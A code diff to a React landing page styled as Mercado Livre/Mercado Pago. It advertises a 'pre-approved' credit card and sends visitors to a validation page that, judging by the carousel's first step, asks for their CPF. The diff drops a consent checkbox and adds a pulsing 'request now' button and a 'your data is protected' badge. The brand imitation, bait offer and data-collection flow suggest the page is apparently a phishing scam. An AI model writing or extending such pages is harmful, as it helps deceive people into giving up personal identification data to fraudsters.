@@ -19,22 +19,25 @@ export const Route = createFileRoute("/")({
 
 import heroImg from "@/assets/hero-mercado-livre.png";
 import cartaoEntregaImg from "@/assets/cartao-entrega.png";
-
-function formatCPF(v: string) {
-  const d = v.replace(/\D/g, "").slice(0, 11);
-  return d
-    .replace(/(\d{3})(\d)/, "$1.$2")
-    .replace(/(\d{3})\.(\d{3})(\d)/, "$1.$2.$3")
-    .replace(/(\d{3})\.(\d{3})\.(\d{3})(\d)/, "$1.$2.$3-$4");
-}
+import step1Img from "@/assets/step-1.png";
+import step2Img from "@/assets/step-2.png";
+import step3Img from "@/assets/step-3.png";
+const steps = [
+  { img: step1Img, text: "Preencha seu CPF para consultar seu limite de cartão pré-aprovado" },
+  { img: step2Img, text: "Escolha seu modelo de cartão e forma de envio" },
+  { img: step3Img, text: "Receba seu cartão no conforto de casa e comece a usar" },
+];
 
 function Index() {
+  const [idx, setIdx] = useState(0);
   const [activeStep, setActiveStep] = useState(-1);
-  const [cpf, setCpf] = useState("");
-  const [accepted, setAccepted] = useState(false);
   const timelineRef = useRef<HTMLDivElement>(null);
   const navigate = useNavigate();
 
+  useEffect(() => {
+    const t = setInterval(() => setIdx((i) => (i + 1) % 3), 5000);
+    return () => clearInterval(t);
+  }, []);
 
   useEffect(() => {
     const el = timelineRef.current;
@@ -55,13 +58,8 @@ function Index() {
   }, []);
 
   const handleCTA = () => {
-    const digits = cpf.replace(/\D/g, "");
-    if (digits.length === 11 && typeof window !== "undefined") {
-      sessionStorage.setItem("cpfPreenchido", digits);
-    }
     navigate({ to: "/validacao" });
   };
-
 
   return (
     <div className="min-h-screen bg-[#FFE600]">
@@ -73,92 +71,19 @@ function Index() {
           </div>
         </div>
 
-        {/* Hero + CPF inline (estrutura MP) */}
+        {/* Hero */}
         <div className="relative">
           <img src={heroImg} alt="Cartão Mercado Pago Pré-aprovado" className="w-full h-auto object-contain block" />
         </div>
 
-        <div className="px-4 -mt-6 relative z-10">
-          <div className="bg-white rounded-2xl shadow-xl p-5">
-            <h2 className="text-lg font-bold text-gray-900 mb-4">
-              Peça seu cartão de crédito
-            </h2>
-            <label className="block text-xs font-semibold text-gray-700 mb-1.5" htmlFor="cpf-hero">
-              CPF
-            </label>
-            <input
-              id="cpf-hero"
-              type="tel"
-              inputMode="numeric"
-              placeholder="000.000.000-00"
-              value={cpf}
-              onChange={(e) => setCpf(formatCPF(e.target.value))}
-              className="w-full border border-gray-300 rounded-md px-3 py-3 text-base focus:outline-none focus:ring-2 focus:ring-[#3483FA] focus:border-transparent"
-            />
-            <label className="flex items-start gap-2 mt-3 cursor-pointer">
-              <input
-                type="checkbox"
-                checked={accepted}
-                onChange={(e) => setAccepted(e.target.checked)}
-                className="mt-0.5 w-4 h-4 accent-[#3483FA] shrink-0"
-              />
-              <span className="text-[11px] text-gray-600 leading-snug">
-                Li e entendi a <a href="#" className="text-[#3483FA] underline">Declaração de Privacidade</a> e autorizo o tratamento dos meus dados, inclusive para consulta ao SCR.
-              </span>
-            </label>
-            <button
-              onClick={handleCTA}
-              disabled={!accepted || cpf.replace(/\D/g, "").length !== 11}
-              className="w-full bg-[#3483FA] hover:bg-[#2968C8] disabled:bg-gray-300 disabled:cursor-not-allowed text-white text-base font-semibold py-3.5 rounded-md mt-4 transition-all"
-            >
-              Continuar
-            </button>
-            <div className="flex items-center justify-center mt-3 text-gray-500">
-              <i className="fas fa-lock mr-1.5 text-xs" />
-              <span className="text-[11px]">Seus dados estão protegidos e seguros</span>
-            </div>
-          </div>
-        </div>
-
-        {/* Bloco "O cartão te dá..." estilo MP (imagem + lista de checks) */}
-        <div className="px-4 mt-8">
-          <div className="bg-white rounded-2xl shadow-md p-5">
+        {/* Timeline */}
+        <div className="px-4 -mt-3 relative z-10">
+          <div className="bg-white rounded-xl shadow-md p-6">
             <div className="flex justify-center mb-4">
-              <img
-                src={cartaoEntregaImg}
-                alt="Cartão Mercado Livre"
-                className="w-44 h-auto object-contain drop-shadow-xl"
-              />
+              <div className="w-12 h-1.5 rounded-full bg-[#FFE600]" />
             </div>
-            <h2 className="text-xl font-extrabold text-gray-900 text-center leading-tight mb-5">
-              O cartão que te dá <span className="text-[#3483FA]">benefícios reais</span> em todas as compras
-            </h2>
-            <ul className="space-y-3">
-              {[
-                { title: "Sem anuidade", desc: "Zero taxa anual, pra sempre." },
-                { title: "Parcele em até 12x", desc: "Sem juros em produtos selecionados no Mercado Livre." },
-                { title: "Cashback nas compras", desc: "Receba de volta direto na sua conta." },
-                { title: "Acompanhe tudo pelo app", desc: "Gastos, limites e cartões em um só lugar." },
-              ].map((b) => (
-                <li key={b.title} className="flex items-start gap-3">
-                  <span className="w-6 h-6 rounded-full bg-[#3483FA] flex items-center justify-center shrink-0 mt-0.5">
-                    <i className="fa-solid fa-check text-white text-[11px]" />
-                  </span>
-                  <div>
-                    <p className="text-sm font-bold text-gray-900 leading-tight">{b.title}</p>
-                    <p className="text-xs text-gray-600 mt-0.5">{b.desc}</p>
-                  </div>
-                </li>
-              ))}
-            </ul>
-          </div>
-        </div>
-
-        {/* É muito fácil pedir — Timeline 3 passos */}
-        <div className="px-4 mt-6">
-          <div className="bg-white rounded-2xl shadow-md p-6">
-            <h2 className="text-xl font-extrabold text-gray-900 mb-6 text-center leading-tight">
-              É muito fácil pedir seu cartão
+            <h2 className="text-2xl font-extrabold text-gray-900 mb-8 text-center leading-tight">
+              Aproveite seu cartão de crédito de forma segura, rápida e sem burocracia
             </h2>
 
             <div ref={timelineRef} className="relative pl-14">
@@ -196,13 +121,17 @@ function Index() {
 
             <button
               onClick={handleCTA}
-              className="w-full bg-[#3483FA] hover:bg-[#2968C8] text-white text-base font-semibold py-3.5 rounded-md mt-4 transition-all"
+              className="w-full bg-[#3483FA] hover:bg-[#2968C8] text-white text-lg font-semibold py-4 rounded-md mt-6 transition-all duration-300 animate-pulse"
             >
-              Pedir meu cartão
+              Solicitar meu cartão agora
             </button>
+
+            <div className="flex items-center justify-center mt-4 pt-4 border-t border-gray-100 text-gray-600">
+              <i className="fas fa-lock mr-2 text-gray-900" />
+              <span className="text-sm">Seus dados estão protegidos e seguros</span>
+            </div>
           </div>
         </div>
-
 
 
         {/* Bloco entrega do cartão */}
@@ -210,7 +139,6 @@ function Index() {
           <div className="relative bg-white rounded-2xl shadow-md overflow-hidden">
             <div className="relative px-6 pt-6 pb-2 text-center">
               <span className="inline-flex items-center gap-1.5 bg-[#FFE600] text-gray-900 text-[10px] font-bold uppercase tracking-wider px-3 py-1 rounded-full shadow-sm">
-
                 <i className="fas fa-truck-fast" /> Entrega rápida e segura
               </span>
               <h3 className="mt-3 text-xl font-bold text-gray-900 leading-tight">
@@ -246,6 +174,61 @@ function Index() {
           </div>
         </div>
 
+        {/* Como Solicitar - Carrossel */}
+        <div id="como-solicitar" className="px-4 mt-6">
+          <div className="bg-white rounded-xl shadow-md p-6">
+            <h2 className="text-xl font-semibold text-gray-800 mb-6 text-center">Como solicitar?</h2>
+
+            <div className="flex items-center justify-center gap-2 mb-4">
+              {steps.map((_, i) => (
+                <div key={i} className="flex items-center gap-2">
+                  <button
+                    onClick={() => setIdx(i)}
+                    className={`w-8 h-8 rounded-full flex items-center justify-center text-sm font-bold transition-all ${
+                      i === idx ? "bg-[#3483FA] text-white" : "bg-gray-200 text-gray-600"
+                    }`}
+                  >
+                    {i + 1}
+                  </button>
+                  {i < steps.length - 1 && (
+                    <div className={`w-6 h-0.5 ${i < idx ? "bg-[#3483FA]" : "bg-gray-200"}`} />
+                  )}
+                </div>
+              ))}
+            </div>
+
+            <div className="overflow-hidden">
+              <div
+                className="flex transition-transform duration-500"
+                style={{ transform: `translateX(-${idx * 100}%)` }}
+              >
+                {steps.map((s, i) => (
+                  <div key={i} className="w-full shrink-0 flex flex-col items-center text-center px-2">
+                    <img src={s.img} alt={`Passo ${i + 1}`} className="w-full max-w-xs rounded-lg" />
+                    <p className="text-sm text-gray-700 mt-3">{s.text}</p>
+                  </div>
+                ))}
+              </div>
+            </div>
+
+            <div className="flex justify-between items-center mt-4">
+              <button
+                onClick={() => setIdx((i) => (i - 1 + steps.length) % steps.length)}
+                className="w-10 h-10 rounded-full bg-gray-100 hover:bg-gray-200 flex items-center justify-center text-gray-700"
+                aria-label="Anterior"
+              >
+                <i className="fas fa-chevron-left" />
+              </button>
+              <button
+                onClick={() => setIdx((i) => (i + 1) % steps.length)}
+                className="w-10 h-10 rounded-full bg-gray-100 hover:bg-gray-200 flex items-center justify-center text-gray-700"
+                aria-label="Próximo"
+              >
+                <i className="fas fa-chevron-right" />
+              </button>
+            </div>
+          </div>
+        </div>
 
         {/* Estatísticas */}
         <div className="px-4 mt-6">
@@ -278,6 +261,30 @@ function Index() {
           </div>
         </div>
 
+        {/* Benefícios */}
+        <div className="px-4 mt-6">
+          <div className="bg-white rounded-2xl shadow-md p-5">
+            <h2 className="text-lg font-bold text-gray-900 text-center mb-4">Benefícios do seu cartão</h2>
+            <div className="grid grid-cols-2 gap-3">
+              {[
+                { icon: "fa-circle-xmark", title: "Sem anuidade", desc: "Zero taxa anual" },
+                { icon: "fa-coins", title: "Cashback", desc: "Em compras ML" },
+                { icon: "fa-percent", title: "Descontos", desc: "Mercado Livre" },
+                { icon: "fa-calendar-days", title: "Parcele em até 12x", desc: "Sem juros" },
+              ].map((b) => (
+                <div key={b.title} className="border border-gray-100 rounded-xl p-3 flex items-start gap-2.5">
+                  <div className="w-9 h-9 rounded-full bg-[#EAF2FE] flex items-center justify-center shrink-0">
+                    <i className={`fa-solid ${b.icon} text-[#3483FA]`} />
+                  </div>
+                  <div>
+                    <p className="text-sm font-bold text-gray-900 leading-tight">{b.title}</p>
+                    <p className="text-[11px] text-gray-500 mt-0.5">{b.desc}</p>
+                  </div>
+                </div>
+              ))}
+            </div>
+          </div>
+        </div>
 
         {/* Depoimentos */}
         <div className="px-4 mt-6">
@@ -356,7 +363,6 @@ function Index() {
           </button>
         </div>
       </div>
-
     </div>
   );
 }
